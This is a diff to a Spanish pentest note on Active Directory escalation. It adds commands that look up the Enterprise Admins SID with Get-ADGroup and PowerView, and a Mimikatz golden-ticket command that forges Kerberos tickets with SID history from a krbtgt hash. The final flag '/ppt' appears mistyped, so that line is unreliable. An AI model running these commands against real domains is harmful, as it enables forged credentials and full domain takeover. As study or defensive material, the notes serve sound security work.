@@ -43,5 +43,20 @@ Para obtener este `SID` se puede hacer de dos formas
 - Desde `cmdlet` 
 
 ```shell
-Get-ADGroup
+Get-ADGroup -Identity "Enterprise Admins" -Server "<Dominio.Principal>"
 ```
+
+- Usando [[POWERVIEW]]
+
+```shell
+Get-DomainGroup -Domain <Dominio.Principal> -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+
+### Explotacion -> MIMIKATZ
+Podemos realizar la explotación después de obtener toda la información usando [[MIMIKATZ]]
+Creando primero el `GOLDEN TICKET`
+
+```shell
+kerberos:golden /user:hacker/<Dominio.Principal> /domain:<Dominio.Principal> /sid:<SID.Secundario> /krbtgt:<hash> /sids:<SID.Principal> /ppt
+```
+
